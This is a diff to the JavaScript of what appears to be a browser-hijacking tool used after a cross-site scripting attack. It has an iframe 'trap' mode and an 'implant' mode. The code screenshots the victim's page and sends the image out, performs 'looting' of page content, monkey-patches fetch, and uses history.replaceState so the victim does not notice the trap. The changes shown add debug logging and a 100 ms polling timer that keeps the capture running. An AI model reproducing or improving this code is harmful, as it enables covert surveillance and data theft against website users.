@@ -182,7 +182,7 @@ function sendScreenshot()
 {
 	if (typeof html2canvas === "function")
 	{
-		// console.log("---Snagging screenshot...");
+		console.log("---Snagging screenshot...");
 
 		var myReferences = "";
 
@@ -194,7 +194,7 @@ function sendScreenshot()
 		{
 			myReference = document;
 		}
-
+		console.log("In screenshot, myreference is set");
 		// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 		html2canvas(myReference.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 		{
@@ -203,7 +203,7 @@ function sendScreenshot()
 				// console.log(this.responseText)
 			};
 
-			//console.log("About to send image....");
+			console.log("About to send image....");
 			// request = new XMLHttpRequest();
 			request = new window.taperXHR();
 			request.noIntercept = true;
@@ -560,6 +560,7 @@ function runUpdate()
 
 	if (window.taperMode === "trap")
 	{
+		// console.log("runUpdate for trap mode");
 		// iFrame trap mode
 		// iFrame trap disable code
 		if (!canAccessIframe(document.getElementById("iframe_a")))
@@ -582,13 +583,14 @@ function runUpdate()
 			// console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
 			window.location = sessionStorage.getItem('taperLastUrl');
 		}
-		// else
-		// {
-		// 	console.log("Looks like canAccessIframe check passed!");
-		// }
+		else
+		{
+			// console.log("Looks like canAccessIframe check passed!");
+		}
 
 		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
 		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
+		// console.log("in runUpdate currentUrl: " + currentUrl +", fullUrl: " + fullUrl);
 	}
 	else
 	{
@@ -596,7 +598,7 @@ function runUpdate()
 		fullUrl    = document.location.href;		
 	}
 
-
+	// console.log("Checking last url: " + sessionStorage.getItem('taperLastUrl'));
 	// Let's see if the URL has changed
 	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
 	{
@@ -625,6 +627,13 @@ function runUpdate()
 		// do HTML based looting. 
 		if (window.taperMode === "trap")
 		{
+			// if (currentUrl != 'blank')
+			// {
+			// 	window.history.replaceState(null, '', currentUrl);
+			// }
+		//	window.history.replaceState(null, '', currentUrl);
+			//captureUrlChangeLoot();
+
 			document.getElementById("iframe_a").onload = function() {
 				// console.log("+++ Onload ready!");
 
@@ -980,6 +989,8 @@ function takeOver()
 		// Just register all the darned events, each event in the iframe
 		// we'll call runUpdate()
 		var myReference = document.getElementById('iframe_a').contentDocument;
+		window.history.replaceState(null, '', taperstartingPage);
+
 	}
 	else // implant mode
 	{
@@ -1010,6 +1021,9 @@ function takeOver()
 			monkeyPatchFetch();
 		}
 	}
+
+	// Add timed just to make sure we get called
+	setInterval(runUpdate, 100);
 }
 
 
